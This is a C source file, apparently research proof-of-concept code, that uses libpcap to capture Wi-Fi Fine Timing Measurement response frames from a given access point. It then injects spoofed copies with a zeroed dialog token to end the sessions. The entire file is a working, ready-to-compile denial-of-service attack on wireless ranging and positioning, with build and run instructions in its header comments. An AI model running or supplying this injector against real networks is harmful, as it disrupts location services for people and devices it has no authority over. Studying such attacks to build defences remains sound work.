// Copyright (C) 2021 Domien Schepers.

#include <pcap.h>
#include <string.h>
#include <stdlib.h>

// Example:
// gcc terminate.c -o terminate -lpcap
// ./terminate wlan0 xx:xx:xx:xx:xx:xx

#define RECEIVE_SNAPLEN 2048
#define RECEIVE_PROMISC 1
#define RECEIVE_TO_MS 1000
#define RECEIVE_IMMEDIATE 1
#define DEBUG

int main( int argc , char **argv ){

	char *iface = NULL;
	char err_buf[PCAP_ERRBUF_SIZE];
	pcap_t* nic;
	struct bpf_program fp;
	const unsigned char *packet;
	struct pcap_pkthdr header;
	char filter[64] = "type mgt subtype 0xd0 && wlan addr2 "; // Filter for action frames.
	
	// Take the arguments from the command line.
	if( argc != 3 ){
		fprintf(stderr,"Usage: ./terminate interface ap-mac-address\n");
		exit(EXIT_FAILURE);
	}else{
		iface = argv[1];
		strncat(filter, argv[2], 18);
	}
	
	////////////////////////////////////////////////////////////////////////////////
	////////////////////////////////////////////////////////////////////////////////
	////////////////////////////////////////////////////////////////////////////////

	// Configure the NIC.
	nic = pcap_create(iface,err_buf);
	if( nic == NULL ){
		fprintf(stderr,"Error: pcap_create(): %s.\n",err_buf);
		exit(EXIT_FAILURE);
	}
	if( pcap_set_promisc(nic,RECEIVE_PROMISC) != 0 ){
		fprintf(stderr,"Error: pcap_set_promisc().\n");
		exit(EXIT_FAILURE);
	}
	if( pcap_set_snaplen(nic,RECEIVE_SNAPLEN) != 0 ){
		fprintf(stderr,"Error: pcap_set_snaplen().\n");
		exit(EXIT_FAILURE);
	}
	if( pcap_set_timeout(nic,RECEIVE_TO_MS) != 0 ){
		fprintf(stderr,"Error: pcap_set_timeout().\n");
		exit(EXIT_FAILURE);
	}
	if( pcap_set_immediate_mode(nic,RECEIVE_IMMEDIATE) != 0 ){
		fprintf(stderr,"Error: pcap_set_immediate_mode().\n");
		exit(EXIT_FAILURE);
	}
	if( pcap_activate(nic) != 0 ){
		fprintf(stderr,"Error: pcap_activate().\n");
		exit(EXIT_FAILURE);
	}
	
	// Apply the filter.
	if( pcap_compile(nic,&fp,filter,0,PCAP_NETMASK_UNKNOWN) != 0 ){
		fprintf(stderr,"Error: pcap_compile().\n");
		exit(EXIT_FAILURE);
	}
	if( pcap_setfilter(nic, &fp) != 0 ){
		fprintf(stderr,"Error: pcap_setfilter().\n");
		exit(EXIT_FAILURE);
	}
	pcap_freecode(&fp);
	
	////////////////////////////////////////////////////////////////////////////////
	/// THE MAGIC HAPPENS BELOW ////////////////////////////////////////////////////s
	////////////////////////////////////////////////////////////////////////////////

	u_char* newPacket;
	int len_radiotap;
	int len_frame;
	u_char t0[] = {0x00,0x00,0x00,0x00,0x00,0x00}; // Reset.

	// Capture a legitimate FTM-Response frame to recover its data structure.
	printf("Waiting for an FTM-Response...\n");
	for(;;){
	
		// Capture the next packet (using action-frame filter).
		while( (packet = pcap_next(nic,&header)) == NULL ){}
		// 24-byte 802.11 Header, and 20-byte fixed FTM-Response (no tagged parameters).
		len_radiotap = packet[2];
		len_frame = len_radiotap + 24 + 20; 
		// Copy read-only packet to something we can modify.
		newPacket = malloc(len_frame);
		memcpy((u_char*)newPacket,packet,len_frame); // Trims FTM Tagged parameters.

		// Reset the DialogToken, terminating the FTM-Session.
		newPacket[len_radiotap+24+2] = 0x00; 

		// Reset timestamps to ensure there are no unexpected results.
		memcpy((u_char*)newPacket+len_radiotap+24+4,(u_char*)t0,6);
		memcpy((u_char*)newPacket+len_radiotap+24+10,(u_char*)t0,6);

#ifdef DEBUG
		// Reset sequence number, makes debugging in Wireshark easier.
		newPacket[len_radiotap+24-2] = 0x00;
		newPacket[len_radiotap+24-1] = 0x00;
#endif

		// Inject the FTM-Response.
		pcap_inject(nic,newPacket,len_frame);
		printf("Injected spoofed FTM-Response terminating the session.\n");

	}

	// Free allocated memory.
	free(newPacket);
	
	////////////////////////////////////////////////////////////////////////////////
	////////////////////////////////////////////////////////////////////////////////
	////////////////////////////////////////////////////////////////////////////////
	
	return 0;
	
}
